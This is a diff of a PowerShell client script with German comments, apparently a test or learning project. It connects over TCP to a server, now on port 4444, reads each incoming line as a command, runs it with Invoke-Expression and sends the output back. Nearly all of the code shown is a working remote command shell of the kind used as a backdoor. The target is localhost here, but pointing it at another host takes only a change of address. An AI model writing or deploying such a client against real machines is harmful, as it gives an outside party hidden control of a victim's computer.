@@ -1,9 +1,10 @@
 #Setup Variablen
 $decision = $true
-
+$result = $null
+$message = $null
 # Client-Skript: Verbindet sich zum Server auf Port 8080
 $serverAddress = "127.0.0.1"  # localhost für Testzwecke
-$port = 8080                    # Der gleiche Port wie im Server-Skript
+$port = 4444                   # Der gleiche Port wie im Server-Skript
 
 try {
     $client = New-Object System.Net.Sockets.TcpClient($serverAddress, $port)
@@ -21,12 +22,12 @@ try {
         try
         {
             #Befehl vom Server bekommen
-            $response = $reader.ReadLine()
+            $message = $reader.ReadLine()
 
-            if($response)
+            if($message)
             {
                 # Führe den empfangenen Befehl aus und sende das Ergebnis zurück
-                $result = Invoke-Expression $response
+                $result = Invoke-Expression $message
                 $writer.WriteLine("$result")
             
                 # Überprüft, ob die Verbindung fortgesetzt werden soll
